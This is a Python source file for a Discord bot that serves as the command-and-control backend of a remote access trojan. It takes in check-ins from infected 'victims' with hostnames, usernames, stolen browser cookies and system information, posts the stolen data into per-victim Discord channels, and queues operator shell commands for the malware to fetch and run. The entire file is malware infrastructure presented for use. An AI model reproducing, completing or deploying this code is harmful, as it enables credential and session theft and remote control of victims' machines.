import discord
from discord.ext import commands
import asyncio
import aiohttp
from aiohttp import web
import json
import sqlite3
from datetime import datetime
import os
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Store active victims {victim_id: {'channel': channel_obj, 'last_seen': timestamp}}
victims = {}
db_conn = sqlite3.connect('victims.db')
db_conn.execute('''CREATE TABLE IF NOT EXISTS victims 
                   (id TEXT PRIMARY KEY, channel_id TEXT, hostname TEXT, username TEXT, first_seen TEXT)''')
db_conn.commit()

@bot.event
async def on_ready():
    print(f'{bot.user} is online and listening')
    bot.loop.create_task(start_http_server())

async def start_http_server():
    app = web.Application()
    app.router.add_post('/checkin', handle_checkin)
    app.router.add_post('/exfil', handle_exfil)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 8080)
    await site.start()
    print('HTTP server running on port 8080')

async def handle_checkin(request):
    data = await request.json()
    victim_id = data['victim_id']
    hostname = data['hostname']
    username = data['username']
    cookies = data.get('cookies', '')
    sysinfo = data.get('sysinfo', '')
    
    if victim_id not in victims:
        # Create new channel
        guild = bot.guilds[0]  # Your server
        category = discord.utils.get(guild.categories, name="VICTIMS")
        if not category:
            category = await guild.create_category("VICTIMS")
        
        channel = await guild.create_text_channel(
            name=f"victim-{hostname}",
            category=category
        )
        
        victims[victim_id] = {
            'channel': channel,
            'last_seen': datetime.now(),
            'hostname': hostname,
            'username': username
        }
        
        db_conn.execute('INSERT OR REPLACE INTO victims VALUES (?, ?, ?, ?, ?)',
                       (victim_id, str(channel.id), hostname, username, str(datetime.now())))
        db_conn.commit()
        
        # Send initial dump
        embed = discord.Embed(title="🔴 NEW VICTIM", color=0xff0000)
        embed.add_field(name="ID", value=victim_id, inline=False)
        embed.add_field(name="Hostname", value=hostname, inline=True)
        embed.add_field(name="Username", value=username, inline=True)
        embed.add_field(name="First Seen", value=str(datetime.now()), inline=False)
        await channel.send(embed=embed)
        
        if sysinfo:
            await channel.send(f"```\n{sysinfo}\n```")
        
        if cookies:
            # Split cookies into chunks (Discord 2000 char limit)
            chunks = [cookies[i:i+1900] for i in range(0, len(cookies), 1900)]
            for chunk in chunks:
                await channel.send(f"```\n{chunk}\n```")
    
    return web.Response(text='OK')

async def handle_exfil(request):
    data = await request.json()
    victim_id = data['victim_id']
    content = data['content']
    
    if victim_id in victims:
        channel = victims[victim_id]['channel']
        chunks = [content[i:i+1900] for i in range(0, len(content), 1900)]
        for chunk in chunks:
            await channel.send(f"```\n{chunk}\n```")
    
    return web.Response(text='OK')

@bot.command()
async def cmd(ctx, *, command):
    """Send command to victim in this channel"""
    victim_id = None
    for vid, vdata in victims.items():
        if vdata['channel'].id == ctx.channel.id:
            victim_id = vid
            break
    
    if not victim_id:
        await ctx.send("❌ This is not a victim channel")
        return
    
    # Store command for RAT to poll
    db_conn.execute('CREATE TABLE IF NOT EXISTS commands (victim_id TEXT, command TEXT, executed INTEGER DEFAULT 0)')
    db_conn.execute('INSERT INTO commands VALUES (?, ?, 0)', (victim_id, command))
    db_conn.commit()
    await ctx.send(f"✅ Command queued: `{command}`")

# Command polling endpoint for RATs
async def get_command(request):
    data = await request.json()
    victim_id = data['victim_id']
    
    cursor = db_conn.execute('SELECT command FROM commands WHERE victim_id=? AND executed=0 LIMIT 1', (victim_id,))
    row = cursor.fetchone()
    
    if row:
        command = row[0]
        db_conn.execute('UPDATE commands SET executed=1 WHERE victim_id=? AND command=?', (victim_id, command))
        db_conn.commit()
        return web.json_response({'command': command})
    
    return web.json_response({'command': None})

token = os.getenv('TOKEN')

bot.run(token)